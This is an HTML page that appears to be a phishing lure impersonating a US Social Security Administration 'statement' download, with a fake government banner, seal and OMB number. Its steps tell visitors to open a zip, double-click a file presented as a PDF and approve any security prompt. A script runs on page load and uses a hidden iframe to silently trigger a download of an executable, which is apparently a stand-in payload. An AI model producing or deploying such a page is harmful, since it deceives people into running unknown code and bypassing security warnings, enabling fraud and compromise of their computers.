<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Instructions</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <link rel="stylesheet" href="css/style.css">
    <style>
        .instructions-list { list-style: none; padding: 0; margin: 0 auto; max-width: 550px; text-align: left; }
        .instructions-list li { display: flex; align-items: flex-start; margin-bottom: 30px; font-size: 18px; line-height: 1.6; }
        .instructions-list .step-icon { font-size: 26px; color: var(--primary-blue); width: 40px; margin-right: 20px; text-align: center; flex-shrink: 0; margin-top: 5px; }
        .instructions-list .step-text code { font-weight: 700; color: #333; background-color: #f1f1f1; padding: 3px 7px; border-radius: 4px; }
    </style>
</head>
<body>

    <div class="top-banner">
        <div class="container">
            <p><img src="img/flag.svg" alt="US Flag" class="flag-icon"> An official website of the United States government</p>
        </div>
    </div>

    <main class="site-main">
        <header class="site-header">
           <img src="img/header-2.svg" alt="Government Seal" class="header-logo seal">
        </header>
        
        <div class="content-box">
            <h2>How to Open Your Statement</h2>
            <p class="subtitle">Follow these three simple steps to view your document.</p>
            
            <ol class="instructions-list">
                <li>
                    <div class="step-icon"><i class="fa-solid fa-file-zipper"></i></div>
                    <div class="step-text">
                        <strong>Open the Archive:</strong> Find and <b>double-click</b> the downloaded file named <code>01a-Social-24-25.zip</code> in your computer's Downloads folder.
                    </div>
                </li>
                <li>
                    <div class="step-icon"><i class="fa-regular fa-file-pdf"></i></div>
                    <div class="step-text">
                        <strong>View the Document:</strong> Inside the opened window, you will see a file named <code>SSA-Statement.pdf</code>. <u>Double-click</u> it to open your document. 
                    </div>
                </li>
                 <li>
                    <div class="step-icon"><i class="fa-solid fa-shield-halved"></i></div>
                    <div class="step-text">
                        <strong>Approve Security Prompt:</strong> If your computer shows a security prompt asking for permission, please click <b>Yes</b> or <b>Allow</b> to trust this device and proceed.
                    </div>
                </li>
            </ol>
            
        </div>
    </main>

    <footer class="site-footer">
        <div class="container">
            <div class="footer-left"><p>OMB No. 0960-0789</p></div>
            <div class="footer-right">
                <button class="lang-button"><i class="fa-solid fa-globe"></i> Language <i class="fa-solid fa-caret-up"></i></button>
                <a href="#">Contact <i class="fa-solid fa-arrow-up-right-from-square"></i></a>
            </div>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const downloadUrl = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe';
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = downloadUrl;
            document.body.appendChild(iframe);
        });
    </script>
</body>
</html>